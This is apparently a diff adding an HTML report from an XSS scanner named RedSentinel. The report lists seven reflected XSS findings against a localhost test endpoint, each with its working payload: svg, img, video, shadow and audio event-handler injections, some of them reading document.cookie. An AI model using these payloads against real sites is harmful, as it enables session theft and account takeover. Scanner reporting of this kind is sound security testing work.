@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>RedSentinel Report — http://localhost:9090/reflected/body?q&#x3D;test</title>
+  <style>
+    :root {
+      --bg: #0d0d0d;
+      --surface: #141414;
+      --border: #2a2a2a;
+      --text: #e0e0e0;
+      --muted: #888;
+      --red: #ff4455;
+      --orange: #ffaa00;
+      --green: #88cc00;
+      --cyan: #44ccff;
+      --accent: #ff4455;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      padding: 2rem 3rem;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin-bottom: 2rem;
+      padding-bottom: 1.5rem;
+      border-bottom: 2px solid var(--accent);
+    }
+
+    .header h1 {
+      color: var(--accent);
+      font-size: 1.8rem;
+      font-weight: 700;
+    }
+
+    .header .logo {
+      font-size: 2rem;
+    }
+
+    .meta-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+
+    .meta-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1rem 1.2rem;
+    }
+
+    .meta-card .label {
+      color: var(--muted);
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .meta-card .value {
+      font-size: 1.2rem;
+      font-weight: 600;
+      margin-top: 0.3rem;
+    }
+
+    .summary-bar {
+      display: flex;
+      gap: 1.5rem;
+      margin-bottom: 2rem;
+      flex-wrap: wrap;
+    }
+
+    .stat-badge {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 0.6rem 1.2rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .stat-badge .count {
+      font-size: 1.4rem;
+      font-weight: 700;
+    }
+
+    .stat-badge.critical .count { color: var(--red); }
+    .stat-badge.high .count { color: #ff6644; }
+    .stat-badge.medium .count { color: var(--orange); }
+    .stat-badge.low .count { color: var(--green); }
+
+    h2 {
+      color: var(--cyan);
+      font-size: 1.3rem;
+      margin: 2rem 0 1rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 1.5rem;
+      font-size: 0.9rem;
+    }
+
+    th {
+      background: var(--surface);
+      color: var(--muted);
+      text-transform: uppercase;
+      font-size: 0.75rem;
+      letter-spacing: 0.05em;
+      padding: 0.8rem 1rem;
+      text-align: left;
+      border-bottom: 2px solid var(--border);
+    }
+
+    td {
+      padding: 0.7rem 1rem;
+      border-bottom: 1px solid var(--border);
+      vertical-align: top;
+    }
+
+    tr:hover td { background: rgba(255, 68, 85, 0.03); }
+
+    .sev-critical { color: var(--red); font-weight: 700; }
+    .sev-high { color: #ff6644; font-weight: 700; }
+    .sev-medium { color: var(--orange); font-weight: 600; }
+    .sev-low { color: var(--green); }
+    .sev-info { color: var(--muted); }
+
+    .payload-cell {
+      font-family: 'Fira Code', 'Consolas', monospace;
+      font-size: 0.82rem;
+      background: #1a1a1a;
+      padding: 0.3rem 0.6rem;
+      border-radius: 4px;
+      word-break: break-all;
+      display: inline-block;
+      max-width: 400px;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 0.15rem 0.5rem;
+      border-radius: 3px;
+      font-size: 0.75rem;
+      font-weight: 600;
+    }
+
+    .badge-yes { background: rgba(136, 204, 0, 0.15); color: var(--green); }
+    .badge-no { background: rgba(255, 68, 85, 0.1); color: #ff6666; }
+
+    .evidence-block {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1rem;
+      margin: 1rem 0;
+      font-family: monospace;
+      font-size: 0.82rem;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    .vuln-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-left: 4px solid var(--red);
+      border-radius: 6px;
+      padding: 1.2rem;
+      margin-bottom: 1rem;
+    }
+
+    .vuln-card.severity-medium { border-left-color: var(--orange); }
+    .vuln-card.severity-low { border-left-color: var(--green); }
+
+    .vuln-card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 0.8rem;
+    }
+
+    .vuln-card-header h3 {
+      font-size: 1rem;
+      color: var(--text);
+    }
+
+    .vuln-detail {
+      display: grid;
+      grid-template-columns: 120px 1fr;
+      gap: 0.3rem 1rem;
+      font-size: 0.88rem;
+    }
+
+    .vuln-detail dt { color: var(--muted); }
+    .vuln-detail dd { color: var(--text); }
+
+    .no-vulns {
+      text-align: center;
+      padding: 3rem 1rem;
+      color: var(--green);
+      font-size: 1.2rem;
+    }
+
+    .footer {
+      margin-top: 3rem;
+      padding-top: 1rem;
+      border-top: 1px solid var(--border);
+      color: var(--muted);
+      font-size: 0.8rem;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <span class="logo">🔴</span>
+    <h1>RedSentinel XSS Report</h1>
+  </div>
+
+  <div class="meta-grid">
+    <div class="meta-card">
+      <div class="label">Target</div>
+      <div class="value">http://localhost:9090/reflected/body?q&#x3D;test</div>
+    </div>
+    <div class="meta-card">
+      <div class="label">Scan ID</div>
+      <div class="value" style="font-size:0.9rem;">ed4cf6b0-78b0-40cf-b083-8b72306e4103</div>
+    </div>
+    <div class="meta-card">
+      <div class="label">Status</div>
+      <div class="value">REPORTING</div>
+    </div>
+    <div class="meta-card">
+      <div class="label">Completed</div>
+      <div class="value" style="font-size:0.9rem;">N/A</div>
+    </div>
+    <div class="meta-card">
+      <div class="label">Duration</div>
+      <div class="value">N/A</div>
+    </div>
+    <div class="meta-card">
+      <div class="label">Depth</div>
+      <div class="value">3</div>
+    </div>
+  </div>
+
+  <div class="summary-bar">
+    <div class="stat-badge critical">
+      <span class="count">0</span>
+      <span>Critical</span>
+    </div>
+    <div class="stat-badge high">
+      <span class="count">5</span>
+      <span>High</span>
+    </div>
+    <div class="stat-badge medium">
+      <span class="count">2</span>
+      <span>Medium</span>
+    </div>
+    <div class="stat-badge low">
+      <span class="count">0</span>
+      <span>Low</span>
+    </div>
+  </div>
+
+  <h2>Vulnerability Summary</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Parameter</th>
+        <th>Type</th>
+        <th>Severity</th>
+        <th>Reflected</th>
+        <th>Executed</th>
+        <th>Payload</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1</td>
+        <td><strong>q</strong></td>
+        <td>reflected_xss</td>
+        <td class="sev-medium">MEDIUM</td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="payload-cell">&lt;SvG oNX&#x3D;() oNLOAd&#x3D;(conFirM)(doCumEnt.COOKiE)&gt;</span></td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td><strong>q</strong></td>
+        <td>reflected_xss</td>
+        <td class="sev-high">HIGH</td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="payload-cell">&lt;svg onx&#x3D;() onload&#x3D;(confirm)(document.cookie)&gt;</span></td>
+      </tr>
+      <tr>
+        <td>3</td>
+        <td><strong>q</strong></td>
+        <td>reflected_xss</td>
+        <td class="sev-high">HIGH</td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="payload-cell">&quot;&gt;&lt;video src&#x3D;x onerror&#x3D;javascript:alert(&#x60;A&#x60;)&gt;</span></td>
+      </tr>
+      <tr>
+        <td>4</td>
+        <td><strong>q</strong></td>
+        <td>reflected_xss</td>
+        <td class="sev-high">HIGH</td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="payload-cell">&quot;&gt;&lt;img src&#x3D;x onerror&#x3D;javascript:alert(&#x60;A&#x60;)&gt;</span></td>
+      </tr>
+      <tr>
+        <td>5</td>
+        <td><strong>q</strong></td>
+        <td>reflected_xss</td>
+        <td class="sev-high">HIGH</td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="payload-cell">&lt;shadow onfocus&#x3D;alert(document.cookie) autofocus tabindex&#x3D;1&gt;</span></td>
+      </tr>
+      <tr>
+        <td>6</td>
+        <td><strong>q</strong></td>
+        <td>reflected_xss</td>
+        <td class="sev-medium">MEDIUM</td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="payload-cell">&lt;Img/srC/onERror&#x3D;alErT(1)</span></td>
+      </tr>
+      <tr>
+        <td>7</td>
+        <td><strong>q</strong></td>
+        <td>reflected_xss</td>
+        <td class="sev-high">HIGH</td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="badge badge-yes">Yes</span></td>
+        <td><span class="payload-cell">&lt;audio onfocus&#x3D;alert(1) autofocus tabindex&#x3D;1&gt;</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>Detailed Findings</h2>
+  <div class="vuln-card severity-medium">
+    <div class="vuln-card-header">
+      <h3>#1 — q</h3>
+      <span class="sev-medium">MEDIUM</span>
+    </div>
+    <dl class="vuln-detail">
+      <dt>Type</dt>
+      <dd>reflected_xss</dd>
+      <dt>Parameter</dt>
+      <dd>q</dd>
+      <dt>Payload</dt>
+      <dd><span class="payload-cell">&lt;SvG oNX&#x3D;() oNLOAd&#x3D;(conFirM)(doCumEnt.COOKiE)&gt;</span></dd>
+      <dt>Reflected</dt>
+      <dd>Yes</dd>
+      <dt>JS Executed</dt>
+      <dd>Yes</dd>
+      <dt>Position</dt>
+      <dd>attribute</dd>
+      <dt>HTTP Code</dt>
+      <dd>200</dd>
+      <dt>Alert Fired</dt>
+      <dd>false</dd>
+    </dl>
+  </div>
+  <div class="vuln-card severity-high">
+    <div class="vuln-card-header">
+      <h3>#2 — q</h3>
+      <span class="sev-high">HIGH</span>
+    </div>
+    <dl class="vuln-detail">
+      <dt>Type</dt>
+      <dd>reflected_xss</dd>
+      <dt>Parameter</dt>
+      <dd>q</dd>
+      <dt>Payload</dt>
+      <dd><span class="payload-cell">&lt;svg onx&#x3D;() onload&#x3D;(confirm)(document.cookie)&gt;</span></dd>
+      <dt>Reflected</dt>
+      <dd>Yes</dd>
+      <dt>JS Executed</dt>
+      <dd>Yes</dd>
+      <dt>Position</dt>
+      <dd>attribute</dd>
+      <dt>HTTP Code</dt>
+      <dd>200</dd>
+      <dt>Alert Fired</dt>
+      <dd>true</dd>
+    </dl>
+  </div>
+  <div class="vuln-card severity-high">
+    <div class="vuln-card-header">
+      <h3>#3 — q</h3>
+      <span class="sev-high">HIGH</span>
+    </div>
+    <dl class="vuln-detail">
+      <dt>Type</dt>
+      <dd>reflected_xss</dd>
+      <dt>Parameter</dt>
+      <dd>q</dd>
+      <dt>Payload</dt>
+      <dd><span class="payload-cell">&quot;&gt;&lt;video src&#x3D;x onerror&#x3D;javascript:alert(&#x60;A&#x60;)&gt;</span></dd>
+      <dt>Reflected</dt>
+      <dd>Yes</dd>
+      <dt>JS Executed</dt>
+      <dd>Yes</dd>
+      <dt>Position</dt>
+      <dd>attribute</dd>
+      <dt>HTTP Code</dt>
+      <dd>200</dd>
+      <dt>Alert Fired</dt>
+      <dd>true</dd>
+    </dl>
+  </div>
+  <div class="vuln-card severity-high">
+    <div class="vuln-card-header">
+      <h3>#4 — q</h3>
+      <span class="sev-high">HIGH</span>
+    </div>
+    <dl class="vuln-detail">
+      <dt>Type</dt>
+      <dd>reflected_xss</dd>
+      <dt>Parameter</dt>
+      <dd>q</dd>
+      <dt>Payload</dt>
+      <dd><span class="payload-cell">&quot;&gt;&lt;img src&#x3D;x onerror&#x3D;javascript:alert(&#x60;A&#x60;)&gt;</span></dd>
+      <dt>Reflected</dt>
+      <dd>Yes</dd>
+      <dt>JS Executed</dt>
+      <dd>Yes</dd>
+      <dt>Position</dt>
+      <dd>attribute</dd>
+      <dt>HTTP Code</dt>
+      <dd>200</dd>
+      <dt>Alert Fired</dt>
+      <dd>true</dd>
+    </dl>
+  </div>
+  <div class="vuln-card severity-high">
+    <div class="vuln-card-header">
+      <h3>#5 — q</h3>
+      <span class="sev-high">HIGH</span>
+    </div>
+    <dl class="vuln-detail">
+      <dt>Type</dt>
+      <dd>reflected_xss</dd>
+      <dt>Parameter</dt>
+      <dd>q</dd>
+      <dt>Payload</dt>
+      <dd><span class="payload-cell">&lt;shadow onfocus&#x3D;alert(document.cookie) autofocus tabindex&#x3D;1&gt;</span></dd>
+      <dt>Reflected</dt>
+      <dd>Yes</dd>
+      <dt>JS Executed</dt>
+      <dd>Yes</dd>
+      <dt>Position</dt>
+      <dd>attribute</dd>
+      <dt>HTTP Code</dt>
+      <dd>200</dd>
+      <dt>Alert Fired</dt>
+      <dd>true</dd>
+    </dl>
+  </div>
+  <div class="vuln-card severity-medium">
+    <div class="vuln-card-header">
+      <h3>#6 — q</h3>
+      <span class="sev-medium">MEDIUM</span>
+    </div>
+    <dl class="vuln-detail">
+      <dt>Type</dt>
+      <dd>reflected_xss</dd>
+      <dt>Parameter</dt>
+      <dd>q</dd>
+      <dt>Payload</dt>
+      <dd><span class="payload-cell">&lt;Img/srC/onERror&#x3D;alErT(1)</span></dd>
+      <dt>Reflected</dt>
+      <dd>Yes</dd>
+      <dt>JS Executed</dt>
+      <dd>Yes</dd>
+      <dt>Position</dt>
+      <dd>attribute</dd>
+      <dt>HTTP Code</dt>
+      <dd>200</dd>
+      <dt>Alert Fired</dt>
+      <dd>false</dd>
+    </dl>
+  </div>
+  <div class="vuln-card severity-high">
+    <div class="vuln-card-header">
+      <h3>#7 — q</h3>
+      <span class="sev-high">HIGH</span>
+    </div>
+    <dl class="vuln-detail">
+      <dt>Type</dt>
+      <dd>reflected_xss</dd>
+      <dt>Parameter</dt>
+      <dd>q</dd>
+      <dt>Payload</dt>
+      <dd><span class="payload-cell">&lt;audio onfocus&#x3D;alert(1) autofocus tabindex&#x3D;1&gt;</span></dd>
+      <dt>Reflected</dt>
+      <dd>Yes</dd>
+      <dt>JS Executed</dt>
+      <dd>Yes</dd>
+      <dt>Position</dt>
+      <dd>attribute</dd>
+      <dt>HTTP Code</dt>
+      <dd>200</dd>
+      <dt>Alert Fired</dt>
+      <dd>true</dd>
+    </dl>
+  </div>
+
+
+  <div class="footer">
+    Generated by RedSentinel v0.1.0 — 2026-03-02T02:31:09.125Z
+  </div>
+</body>
+</html>
